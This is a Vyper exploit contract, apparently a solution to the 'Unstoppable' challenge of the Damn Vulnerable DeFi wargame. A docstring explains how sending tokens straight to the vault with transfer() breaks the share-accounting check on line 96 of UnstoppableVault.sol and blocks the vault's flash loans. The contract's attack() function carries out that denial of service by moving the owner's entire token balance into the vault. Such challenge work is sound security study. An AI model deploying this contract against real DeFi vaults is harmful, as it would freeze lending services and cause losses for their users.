# @version ^0.3.7

"""
The vulnerability is on line 96 of UnstoppableVault.sol.
`totalAssets()` takes into the account of the balance of 
DVT for the vault. `convertToShares()` does calculation 
with `totalSupply()` and divides by `totalAssets()`. 
`totalSupply()` does not change when you send tokens to 
the vault via `transfer()`, but `totalAssets()` does. 
Sending tokens via `transfer()` will make the check on 
line 96 fail. Using `converToAssets()` instead will protect 
against this attack.
"""

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

vault: address
token: address

@external
@payable
def __init__(_vault: address, _token: address):
    owner = msg.sender
    self.vault = _vault
    self.token = _token

@external
def attack():
    assert msg.sender == owner, "!owner"
    IERC20(self.token).transferFrom(
        owner,
        self.vault,
        IERC20(self.token).balanceOf(owner),
    )
